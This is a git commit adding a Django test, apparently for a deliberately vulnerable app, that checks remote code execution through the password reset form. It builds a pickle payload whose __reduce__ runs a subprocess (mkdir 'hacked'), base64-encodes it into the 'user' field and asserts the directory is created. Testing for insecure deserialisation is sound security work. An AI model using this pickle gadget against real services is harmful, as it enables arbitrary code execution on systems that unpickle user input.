ba99b17efb3b537e2b88737d7f767ff55e4cfefe
Vinai Rachakonda <rachakondavinai@gmail.com>
2017-06-29 11:32:48 -0400

    wrote test for remote code execution

---
+++ app/tests/vulnerabilities/test_extra_remote_code_execution.py
@@ -0,0 +1,30 @@
+from django.test import TestCase, RequestFactory, Client
+from django.shortcuts import reverse
+import pickle
+import base64
+import subprocess
+import os
+
+class GenProcess(object):
+    def __reduce__(self):
+        return (subprocess.Popen, (['mkdir', 'hacked'],))
+
+
+class TestRemoteCodeExecution(TestCase):
+    # setup for all test cases
+    def setUp(self):
+        self.factory = RequestFactory()
+        self.client = Client()
+        self.route_name = 'app:password_resets'
+
+    def test_directory_is_made(self):
+        encoded = base64.b64encode(pickle.dumps(GenProcess()))
+        data = {'password': '123456',
+                'password_confirmation': '123456',
+                'user': encoded}
+        try:
+            response = self.client.post(reverse('app:password_resets'), data=data)
+        except:
+            pass
+        self.assertTrue(os.path.isdir("hacked"))
+        os.rmdir('hacked')
